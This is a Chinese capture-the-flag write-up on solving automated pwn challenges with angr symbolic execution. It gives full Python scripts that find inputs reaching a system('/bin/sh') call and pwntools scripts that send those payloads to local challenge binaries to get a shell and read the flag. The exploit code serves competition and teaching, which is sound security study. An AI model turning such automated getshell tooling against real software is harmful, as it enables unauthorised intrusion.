> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [bbs.pediy.com](https://bbs.pediy.com/thread-266757.htm)

前几天去三亚打了个自动化 Pwn 类型的线下赛（纵横杯）。作为一个 RE 选手，咱也不懂 fuzz 和 AFL，于是就整了一手符号执行来解题。虽然最后没拿到奖，但在准备比赛的过程中还是学到了很多东西，这里总结一下能纯靠符号执行解决的两种题型。

0x00. 题型 1：程序存在逻辑问题，触发错误逻辑 getshell
===================================

本次纵横杯的第 5 题，程序非常简单，伪代码如下：  
![](https://bbs.pediy.com/upload/attach/202103/910514_GY7GC3N5QDM5NNJ.png)  
![](https://bbs.pediy.com/upload/attach/202103/910514_NB4QM36YWH5DJVH.png)  
这题大体是个 while+switch 结构，只要能执行到上图中红框部分即可 getshell。程序非常简单，所以可以直接用 angr 一把梭：

```
import angr
from binascii import b2a_hex
 
def angr_run():
    proj = angr.Project('./bin5')
    state = proj.factory.entry_state()
    simgr = proj.factory.simgr(state)
    simgr.explore(find=0x08048783)
    payload = simgr.found[0].posix.dumps(0)
    print(f'payload={b2a_hex(payload)}')
 
angr_run()

```

输出：  
![](https://bbs.pediy.com/upload/attach/202103/910514_UY6TDQC2YSEVYYV.png)  
因为 angr 和 pwntools 不兼容，所以计算 payload 和 getshell 我分成了两个脚本来写，getshell 脚本：

```
from pwn import *
from binascii import a2b_hex
import re
 
sh = process('./bin5')
sh.sendline(a2b_hex('310a320a'))
sh.sendline('cat flag.txt')
flag = sh.recvall(timeout=5)
flag = re.findall(r'\{(.*?)\}', flag.decode())
print(f'flag=flag{{{flag[0]}}}')

```

输出：  
![](https://bbs.pediy.com/upload/attach/202103/910514_P8862JBADMM4Q4M.png)  
比赛之前也没想到有这种可以直接用 angr 一把梭的题。。。痛失 1w 奖金。

0x01. 简单的路径搜索，考察 AI 对分支的判断
==========================

线上调试时的第一道例题，比赛前我针对这道例题的结构写了个 exp，没想到比赛题的结构完全不一样，所以也没跑出来呜呜。但我觉得这道例题对我们学习符号执行帮助也很大，所以拿出讲一讲。  
这题的核心是通过前面的 n 各分支，只能要执行到最后即可 getshell：  
![](https://bbs.pediy.com/upload/attach/202103/910514_R7E764EFAUDNMZP.png)  
CFG 大概是这个样子，总之非常恐怖：  
![](https://bbs.pediy.com/upload/attach/202103/910514_UN3YCUBGXJTEAFV.png)  
由于多了很多分支，这题没法用 angr 直接 explore，于是我在群里问了几个师傅的想法，拿到了师傅的一篇博客（赚到赚到）：[关于 Faster 的那些事...](https://myts2.cn/2020/05/24/guan-yu-fasterde-na-xie-shi/)

 

总的来说，用符号执行解决这种分支问题有两个思路：

1.  找到所有从函数入口到 system 函数的路径，对每条路径进行操作，在每两个基本块之间进行 explore
2.  找到所有从函数入口到 system 函数的路径，将其他不在路径上的基本块地址添加到 avoid_list 中，再从函数入口开始 explore

我这里采取的是第二种思路，因为如果考虑多条路径的情况第一种思路很难写。

 

因为是自动化 pwn，一开始我们并不知道 system 函数，所以先求得 system 函数的地址（题型 1 中的 exp 省略了这个步骤）：

```
proj = angr.Project(bin_path, load_options={'auto_load_libs': False})
proj_cfg = proj.analyses.CFGFast()
system_addr = get_system_addr(proj_cfg)

```

```
'''
获取system函数的地址
'''
def get_system_addr(cfg):
    for func_addr in cfg.functions:
        func = cfg.functions.get(func_addr)
        if func.name == 'system':
            return func_addr
    return None

```

然后找到哪些函数中存在 **call system** 指令，找到这些函数的地址，以及 **call system** 指令所在基本块的地址：

```
if system_addr == None:
    return []
print(f'Found system function in {hex(system_addr)}.')
payload_list = []
for func_addr in proj_cfg.functions:
    try:
        func = proj_cfg.functions.get(func_addr)
        cfg = func.transition_graph
        cfg = to_supergraph(cfg)
 
        for node in cfg.nodes:
            block = proj.factory.block(node.addr)
            for inst in block.capstone.insns:
                if inst.mnemonic == 'call' and inst.op_str == hex(system_addr):
                    target_func = func_addr
                    target_block = block.addr
                    target_cfg = cfg
                    print(f'Found target function in {hex(target_func)}')
                    print(f'Found target block in {hex(target_block)}')
                    payload_list += explore_func(proj, target_func, target_block, target_cfg)
    except Exception as ex:
        print(ex)

```

对调用了 system 函数的函数进行符号执行，也就是调用上述代码中的 **explore_func** 函数，传入目标函数的地址、**system("/bin/sh")** 所在基本块的地址以及目标函数的 CFG。

 

按照我们之前说的思路，首先我们要找到一条从函数入口到目标基本块的一条路径，然后将不在路径上的其他基本块地址添加到 avoid_list 中，这样的目的是**避免 angr 在其他根本不可能到达目标基本块的分支上进行约束求解**。实现如下：

```
'''
获取避免执行到的地址列表
关键！可以大大提高angr符号执行速度
'''
def get_avoid_list(cfg, start, target):
    if start.addr == target:
        return (True, [])
    succs = list(cfg.successors(start))
    if len(succs) == 0:
        return (False, [start.addr])
    elif len(succs) == 1:
        can_reach_target, avoid_list = get_avoid_list(cfg, succs[0], target)
        if can_reach_target:
            return (True, avoid_list)
        else:
            avoid_list.append(start.addr)
            return (False, avoid_list)
    elif len(succs) == 2:
        can_reach_target0, avoid_list0 = get_avoid_list(cfg, succs[0], target)
        can_reach_target1, avoid_list1 = get_avoid_list(cfg, succs[1], target)
        if can_reach_target0 and can_reach_target1:
            return (True, [])
        elif not can_reach_target0 and not can_reach_target1:
            avoid_list = avoid_list0 + avoid_list1
            avoid_list.append(start.addr)
            return (False, avoid_list)
        else:
            avoid_list = avoid_list0 + avoid_list1
            return (True, avoid_list)
    else:
        exit(0)

```

搜索路径的方法是 DFS（深度优先搜索），不了解 DFS 的朋友可以自行学习一下，这里不多解释了。

 

得到了 avoid_list 之后就可以直接进行 explore 了：

```
'''
对目标函数进行符号执行，求解到达call system执行所需要的输入
'''
def explore_func(proj, target_func, target_block, target_cfg):
    can_reach_target, avoid_list = get_avoid_list(target_cfg, list(target_cfg.nodes)[0], target_block)
    state = proj.factory.call_state(target_func)
    simgr = proj.factory.simgr(state)
    simgr.use_technique(angr.exploration_techniques.DFS())
    simgr.explore(find=target_block, avoid=avoid_list)
    payload_list = []
    for found in simgr.found:
        payload_list.append(found.posix.dumps(0))
    return payload_list

```

注意这里的：

```
simgr.use_technique(angr.exploration_techniques.DFS())

```

含义是采取 DFS 策略进行符号执行。angr 默认的符号执行方式类似 BFS，即一次会有多个 active state 同时进行 step，DFS 策略会使符号执行过程中一次只有一个 active state 进行 step：  
![](https://bbs.pediy.com/upload/attach/202103/910514_SVUJ22JC4PCZWUF.png)  
其实我也没明白这里为什么用 DFS 会快一点，总之能跑就行 233。

 

完整代码：

```
import angr
from angrmanagement.utils.graph import to_supergraph
from binascii import b2a_hex
 
'''
获取system函数的地址
'''
def get_system_addr(cfg):
    for func_addr in cfg.functions:
        func = cfg.functions.get(func_addr)
        if func.name == 'system':
            return func_addr
    return None
 
'''
获取避免执行到的地址列表
关键！可以大大提高angr符号执行速度
'''
def get_avoid_list(cfg, start, target):
    if start.addr == target:
        return (True, [])
    succs = list(cfg.successors(start))
    if len(succs) == 0:
        return (False, [start.addr])
    elif len(succs) == 1:
        can_reach_target, avoid_list = get_avoid_list(cfg, succs[0], target)
        if can_reach_target:
            return (True, avoid_list)
        else:
            avoid_list.append(start.addr)
            return (False, avoid_list)
    elif len(succs) == 2:
        can_reach_target0, avoid_list0 = get_avoid_list(cfg, succs[0], target)
        can_reach_target1, avoid_list1 = get_avoid_list(cfg, succs[1], target)
        if can_reach_target0 and can_reach_target1:
            return (True, [])
        elif not can_reach_target0 and not can_reach_target1:
            avoid_list = avoid_list0 + avoid_list1
            avoid_list.append(start.addr)
            return (False, avoid_list)
        else:
            avoid_list = avoid_list0 + avoid_list1
            return (True, avoid_list)
    else:
        exit(0)
 
'''
对目标函数进行符号执行，求解到达call system执行所需要的输入
'''
def explore_func(proj, target_func, target_block, target_cfg):
    can_reach_target, avoid_list = get_avoid_list(target_cfg, list(target_cfg.nodes)[0], target_block)
    state = proj.factory.call_state(target_func)
    simgr = proj.factory.simgr(state)
    simgr.use_technique(angr.exploration_techniques.DFS())
    simgr.explore(find=target_block, avoid=avoid_list)
    payload_list = []
    for found in simgr.found:
        payload_list.append(found.posix.dumps(0))
    return payload_list
 
'''
求解所有可行的payload
'''
def explore_payload(bin_path):
    proj = angr.Project(bin_path, load_options={'auto_load_libs': False})
    proj_cfg = proj.analyses.CFGFast()
    system_addr = get_system_addr(proj_cfg)
    if system_addr == None:
        return []
    print(f'Found system function in {hex(system_addr)}.')
    payload_list = []
    for func_addr in proj_cfg.functions:
        try:
            func = proj_cfg.functions.get(func_addr)
            cfg = func.transition_graph
            cfg = to_supergraph(cfg)
 
            for node in cfg.nodes:
                block = proj.factory.block(node.addr)
                for inst in block.capstone.insns:
                    if inst.mnemonic == 'call' and inst.op_str == hex(system_addr):
                        target_func = func_addr
                        target_block = block.addr
                        target_cfg = cfg
                        print(f'Found target function in {hex(target_func)}')
                        print(f'Found target block in {hex(target_block)}')
                        payload_list += explore_func(proj, target_func, target_block, target_cfg)
        except Exception as ex:
            print(ex)
    return payload_list
 
def angr_run():
    payload_list = explore_payload('./bin1')
    print(payload_list)
    for payload in payload_list:
        print('payload=' +  b2a_hex(payload).decode())
 
angr_run()

```

输出：  
![](https://bbs.pediy.com/upload/attach/202103/910514_A5V2WVD4J7ADMKH.png)  
getshell：

```
from pwn import *
from binascii import a2b_hex
import re
 
sh = process('./bin1')
sh.sendline(a2b_hex('310a6dbe0a0a2b310a31240a0a310a310a0a310a310a'))
sh.sendline('cat flag.txt')
flag = sh.recvall(timeout=5)
flag = re.findall(r'\{(.*?)\}', flag.decode())
print(f'flag=flag{{{flag[0]}}}')

```

输出：  
![](https://bbs.pediy.com/upload/attach/202103/910514_DZXUH636KRUGT4Y.png)

 

两道题目的文件可以在附件中下载。

[[公告] 2021 KCTF 春季赛 防守方征题火热进行中！](https://bbs.pediy.com/thread-266222.htm)

上传的附件：

*   [bin5](javascript:void(0)) （5.48kb，1 次下载）
*   [bin1](javascript:void(0)) （53.48kb，1 次下载）